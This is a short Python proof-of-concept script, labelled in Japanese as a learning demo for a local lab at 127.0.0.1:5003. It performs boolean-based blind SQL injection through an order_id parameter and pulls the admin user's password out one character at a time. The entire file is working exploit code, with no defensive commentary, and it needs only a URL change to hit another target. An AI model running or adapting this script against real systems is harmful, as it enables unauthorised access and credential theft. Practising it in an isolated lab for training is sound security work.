"""
PoC③用: Boolean-based Blind SQL injection の簡易抽出デモ。

学習用ローカル環境専用。デフォルトでは http://127.0.0.1:5003/track だけを対象にする。
"""
import string
import sys
from urllib.parse import urlencode

import requests


BASE_URL = "http://127.0.0.1:5003/track"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*_-"
MAX_LENGTH = 32


def is_true(position, candidate):
    payload = (
        "1 AND "
        "(SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin') = '{char}'"
    ).format(pos=position, char=candidate.replace("'", "''"))
    url = BASE_URL + "?" + urlencode({"order_id": payload})
    response = requests.get(url, timeout=5)
    response.raise_for_status()
    return "見つかりました" in response.text


def main():
    found = ""
    for position in range(1, MAX_LENGTH + 1):
        for candidate in CHARSET:
            if is_true(position, candidate):
                found += candidate
                print(f"[+] {position}: {found}")
                break
        else:
            print(f"[done] admin password = {found}")
            return

    print(f"[stop] reached MAX_LENGTH. partial password = {found}")


if __name__ == "__main__":
    try:
        main()
    except requests.RequestException as exc:
        print(f"request failed: {exc}", file=sys.stderr)
        sys.exit(1)
